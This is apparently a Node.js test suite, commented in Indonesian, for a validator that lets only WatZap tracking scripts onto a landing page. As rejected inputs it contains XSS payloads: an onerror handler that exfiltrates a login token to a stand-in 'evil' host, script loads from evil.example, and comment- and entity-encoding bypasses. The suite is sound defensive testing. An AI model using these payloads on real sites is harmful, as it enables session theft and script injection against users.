import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  TRACKING_SCRIPT_LIMIT,
  normalizeTrackingScript,
  trackingScriptError,
} from '../lib/landing-tracking-script.js';

/**
 * Snippet LPWA WatZap sungguhan (project key disamarkan). Bentuk inilah yang
 * harus tetap lolos: satu <script src> ke secure.watzap.chat, query ber-URL
 * ter-encode, plus atribut data-*.
 */
const LPWA = '<script src="https://secure.watzap.chat/wzp/v1/baxia.js'
  + '?project=wzp_XXXXXXXXXXXXXXXXXXXXXX'
  + '&endpoint=https%3A%2F%2Fsecure.watzap.chat%2Fapi%2Flp%2Ftrack" '
  + 'data-wzp-project="wzp_XXXXXXXXXXXXXXXXXXXXXX" '
  + 'data-wzp-endpoint="https://secure.watzap.chat/api/lp/track"></script>';

test('undefined = field tidak dikirim → jangan sentuh yang tersimpan', () => {
  assert.equal(normalizeTrackingScript(undefined), undefined);
});

test('kosong = agent menghapus isinya → null (tidak menyuntik apa pun)', () => {
  assert.equal(normalizeTrackingScript(null), null);
  assert.equal(normalizeTrackingScript(''), null);
  assert.equal(normalizeTrackingScript('   \n\t  '), null);
});

test('tipe non-string diabaikan, bukan disimpan mentah', () => {
  for (const value of [42, true, {}, [], () => {}]) {
    assert.equal(normalizeTrackingScript(value), undefined);
  }
});

test('tracker LPWA WatZap tersimpan apa adanya (cuma di-trim di tepi)', () => {
  assert.equal(trackingScriptError(LPWA), null);
  assert.equal(normalizeTrackingScript(`\n  ${LPWA}  \n`), LPWA);
});

test('komentar HTML penyerta snippet tidak membatalkan validasi', () => {
  const withComment = `<!-- LPWA Tracker -->\n${LPWA}\n<!-- End LPWA Tracker -->`;
  assert.equal(trackingScriptError(withComment), null);
  assert.equal(normalizeTrackingScript(withComment), withComment);
});

test('beberapa tag tracker WatZap sekaligus tetap sah', () => {
  const dua = `${LPWA}\n<script src="https://secure.watzap.chat/wzp/v1/x.js" async></script>`;
  assert.equal(trackingScriptError(dua), null);
});

test('subdomain WatZap boleh, host yang cuma MEMUAT namanya tidak', () => {
  const sah = [
    'https://secure.watzap.chat/wzp/v1/baxia.js',
    'https://watzap.chat/t.js',
    'https://watzap.id/t.js',
    '//secure.watzap.chat/t.js',
  ];
  for (const src of sah) {
    assert.equal(trackingScriptError(`<script src="${src}"></script>`), null, src);
  }
  const palsu = [
    'https://secure.watzap.chat.evil.com/t.js',
    'https://notwatzap.chat/t.js',
    'https://evil.com/secure.watzap.chat/t.js',
    'https://evil.com/t.js?ref=secure.watzap.chat',
  ];
  for (const src of palsu) {
    assert.equal(
      trackingScriptError(`<script src="${src}"></script>`),
      'Sumber skrip harus dari watzap.chat',
      src,
    );
  }
});

test('skrip inline ditolak — itu satu-satunya hal yang bikin whitelist berarti', () => {
  const inline = [
    "<script>fbq('init','1')</script>",
    `${LPWA}\n<script>lpwa('start')</script>`,
    '<script src="https://secure.watzap.chat/wzp/v1/baxia.js">lpwa()</script>',
    '<script>\n  fetch("/x")\n</script>',
  ];
  for (const value of inline) {
    assert.equal(trackingScriptError(value), 'Skrip inline tidak diperbolehkan — hanya <script src> dari watzap.chat', value);
    assert.throws(() => normalizeTrackingScript(value), /Skrip inline/, value);
  }
});

test('src relatif / javascript: / data: bukan URL WatZap → ditolak', () => {
  for (const src of ['/t.js', 'tracker.js', 'javascript:alert(1)', 'data:text/javascript,alert(1)']) {
    assert.equal(
      trackingScriptError(`<script src="${src}"></script>`),
      'Sumber skrip harus dari watzap.chat',
      src,
    );
  }
});

test('pixel vendor lain (Meta, Google, TikTok) sekarang ditolak', () => {
  const lain = [
    '<script src="https://connect.facebook.net/en_US/fbevents.js"></script>',
    '<script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>',
    '<script src="https://analytics.tiktok.com/i18n/pixel/events.js"></script>',
  ];
  for (const value of lain) {
    assert.equal(trackingScriptError(value), 'Sumber skrip harus dari watzap.chat', value);
  }
});

test('tag selain <script> dan teks lepas ditolak', () => {
  const nakal = [
    '<img src="https://secure.watzap.chat/p.gif">',
    `<iframe src="https://secure.watzap.chat/x"></iframe>`,
    `${LPWA}<div onclick="x()">halo</div>`,
    `halo ${LPWA}`,
    `${LPWA} teks nyelip`,
    'pasang tracker di sini ya',
  ];
  for (const value of nakal) {
    assert.match(trackingScriptError(value) || '', /Hanya tracker LPWA WatZap/, value);
  }
});

test('menutup body/html lebih awal ditolak — apa pun ejaannya', () => {
  // Sekarang tersaring oleh aturan "hanya <script src> WatZap", bukan lagi
  // pemeriksaan </body> tersendiri. Titik suntik mencari '</body>' PERTAMA,
  // jadi kebocoran di sini akan memotong sticky bar + CAPI agent.
  const nakal = [
    `${LPWA}</body>`,
    `${LPWA}</BODY>`,
    `${LPWA}</ body>`,
    `${LPWA}</\tbody >`,
    `${LPWA}</html>`,
    '</Html>',
  ];
  for (const value of nakal) {
    assert.match(trackingScriptError(value) || '', /Hanya tracker LPWA WatZap/, value);
    assert.throws(() => normalizeTrackingScript(value), /Tracking script:/, value);
  }
});

test('batas panjang ditegakkan di sini, bukan di limit express.json per-route', () => {
  const isi = (n) => LPWA.replace('/wzp/v1/baxia.js', '/' + 'a'.repeat(n) + '.js');
  const PAD = '/wzp/v1/baxia.js'.length - '/.js'.length;
  const pas = isi(TRACKING_SCRIPT_LIMIT - LPWA.length + PAD);
  const lebih = isi(TRACKING_SCRIPT_LIMIT + 1 - LPWA.length + PAD);
  assert.equal(pas.length, TRACKING_SCRIPT_LIMIT);
  assert.equal(trackingScriptError(pas), null);
  assert.equal(normalizeTrackingScript(pas), pas);
  assert.equal(trackingScriptError(lebih), `Melebihi batas ${TRACKING_SCRIPT_LIMIT} karakter`);
  assert.throws(() => normalizeTrackingScript(lebih), /Melebihi batas/);
});

test('spasi di tepi tidak ikut dihitung sebagai kelebihan panjang', () => {
  assert.equal(trackingScriptError(`   ${LPWA}   `), null);
});

test('trackingScriptError aman dipanggil untuk nilai kosong/non-string', () => {
  assert.equal(trackingScriptError(''), null);
  assert.equal(trackingScriptError('   '), null);
  assert.equal(trackingScriptError(undefined), null);
  assert.equal(trackingScriptError(null), null);
});

// Audit 22 Okt 2026: lima bentuk ini lolos validator lama dan menjalankan JS
// penyerang di origin alhijaz.co (satu origin dengan token login dashboard).
test('event handler & atribut selain src/async/defer/data-* ditolak', () => {
  const W = 'https://secure.watzap.chat/x404.js';
  const nakal = [
    `<script src="${W}" onerror="fetch('//evil/'+localStorage.auth_session)"></script>`,
    `<script src="${W}" onload=alert(1)></script>`,
    `<script onerror=alert(1) src="${W}"></script>`,
    `<script src="${W}" ONERROR="alert(1)"></script>`,
    `<script src="${W}" type="module"></script>`,
    `<script src="${W}" style="x"></script>`,
  ];
  for (const value of nakal) {
    assert.match(trackingScriptError(value) || '', /Atribut tidak diperbolehkan/, value);
  }
});

test('src ganda / data-src tidak bisa menyamarkan src sungguhan', () => {
  const nakal = [
    '<script data-src="https://secure.watzap.chat/a.js" src="https://evil.example/x.js"></script>',
    '<script src="https://secure.watzap.chat/a.js" src="https://evil.example/x.js"></script>',
    '<script src="https://evil.example/x.js" src="https://secure.watzap.chat/a.js"></script>',
  ];
  for (const value of nakal) {
    assert.ok(trackingScriptError(value), value);
  }
});

test('referensi karakter di src (didekode browser sebelum URL di-parse) ditolak', () => {
  const nakal = [
    '<script src="https://evil.example&sol;.watzap.chat/x.js"></script>',
    '<script src="https://evil.example&#47;.watzap.chat/x.js"></script>',
    '<script src="https://evil.example&#x2f;.watzap.chat/x.js"></script>',
  ];
  for (const value of nakal) {
    assert.equal(trackingScriptError(value), 'Sumber skrip harus dari watzap.chat', value);
  }
  // &amp; dan & mentah di query tetap sah.
  assert.equal(trackingScriptError('<script src="https://secure.watzap.chat/a.js?x=1&amp;y=2&z=3"></script>'), null);
});

test('komentar yang ditutup browser di tempat lain dari regex ditolak', () => {
  const nakal = [
    `${LPWA}<!-- --!><script>alert(1)</script> -->`,
    `<!--><script>alert(1)</script>-->${LPWA}`,
    `<script src="https://secure.watzap.chat/a.js"><!--</script><script>alert(1)</script>--></script>`,
    `<!-- <img src=x onerror=alert(1)> -->${LPWA}`,
  ];
  for (const value of nakal) {
    assert.ok(trackingScriptError(value), value);
  }
});

test('tag penutup longgar (</ script>) tidak dianggap menutup script', () => {
  const value = '<script src="https://secure.watzap.chat/a.js"></ script><script>alert(1)</script>';
  assert.ok(trackingScriptError(value));
});
